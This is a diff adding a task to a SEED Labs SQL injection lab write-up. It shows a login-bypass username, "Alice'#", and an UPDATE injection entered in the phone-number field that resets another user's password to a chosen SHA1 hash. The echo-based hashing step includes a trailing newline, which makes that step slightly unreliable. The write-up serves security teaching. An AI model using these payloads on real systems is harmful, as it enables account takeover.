@@ -95,3 +95,29 @@ Log in with Boby
  
  ![alt text](https://github.com/Asad-Ali-Code/Seed-Lab-Sql-Injection-Attack/blob/main/salary%20of%20boby%20change.PNG)
  
+## Task 3.3
+
+The simplest approach is to log-in as Alice like Task 3.1 and change the password.
+Log in with Boby 
+- USERNAME : ```"Alice'#"```
+- PASSWORD : ```""```
+
+ Than enter http://www.seedlabsqlinjection.com/unsafe_edit_frontend.php 
+ 
+ Assume we want to change Alice's password as ```12345```. First, we should get SHA1 value of our new password via Terminal using Command
+ 
+ ```echo "12345"|sha1sum```
+  ![alt text](https://github.com/Asad-Ali-Code/Seed-Lab-Sql-Injection-Attack/blob/main/hash%20pass.PNG)
+  
+ So our SHA1 code is 
+ 
+ ```2672275fe0c456fb671e4f417fb2f9892c7573ba```
+ 
+ Than Modify Phone Number as ```', password='2672275fe0c456fb671e4f417fb2f9892c7573ba' where name='Alice' #``` and save.
+ 
+ ![alt text](https://github.com/Asad-Ali-Code/Seed-Lab-Sql-Injection-Attack/blob/main/Alice%20pass%20update.PNG)
+ 
+ now you login to Alice
+ - USERNAME : ```Alice```
+ - PASSWORD : ```12345```
+ 
